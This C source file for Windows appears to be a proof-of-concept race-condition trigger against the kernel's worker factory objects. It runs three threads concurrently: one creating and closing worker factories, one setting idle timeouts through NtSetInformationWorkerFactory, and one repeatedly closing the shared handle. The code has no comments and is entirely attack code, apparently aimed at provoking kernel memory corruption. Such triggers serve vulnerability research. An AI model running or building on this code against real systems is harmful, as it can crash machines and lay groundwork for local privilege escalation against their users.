#include "nt.h"
#include "stdio.h"
#include "time.h"

#define TEST_RACE_COUNT 0x6000

HANDLE hWorkingFactory;
HANDLE hIoCompletion;
HANDLE hProcess;

DWORD WINAPI th_working_factory_constructor(LPVOID Param) 
{
  WORKER_FACTORY_BASIC_INFORMATION worker_info_buf = { 0x0 };
  DWORD out_len;
  hProcess = GetCurrentProcess();
  hIoCompletion = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 0);
  LONG wk;
  NTSTATUS stat;
  for (int i = 0; i < 0x800000; i++) {
    hWorkingFactory = NULL;
    stat = NtCreateWorkerFactory(&hWorkingFactory, GENERIC_ALL, NULL, hIoCompletion, hProcess, NULL, 0, 2, 0, 0);
    NtClose(hWorkingFactory);
  }

  ExitThread(0);
}

void race_test_working_factory() 
{
  LARGE_INTEGER liDueTime;

  LONGLONG timeouts[] = { -1000000LL, -2000000LL, -3000000LL, -5000000LL, -10000000LL, -20000000LL, -30000000LL };

  LONG wk;
  for (size_t k = 0; k < 7; k++) {
    for (size_t i = 0; i < TEST_RACE_COUNT; i++) {
      liDueTime.QuadPart = timeouts[k];    // 0.1-20 seconds
      NtSetInformationWorkerFactory(hWorkingFactory, WorkerFactoryIdleTimeout, &liDueTime, sizeof(liDueTime));
    }
  }
}

void race_test_close() {
  while (1) {
    NtClose(hWorkingFactory);
  }
}

void race_test_nls() {
  getchar();
  HANDLE hThread_constructor = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)th_working_factory_constructor, 0, 0, NULL);
  HANDLE hThread_constructor3 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)race_test_working_factory, 0, 0, NULL);
  HANDLE hThread_constructor2 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)race_test_close, 0, 0, NULL);
  WaitForSingleObject(hThread_constructor, INFINITE);
}

int main() {
  srand(time(NULL));
  init_lib_calls();
  hProcess = GetCurrentProcess();
  race_test_nls();
}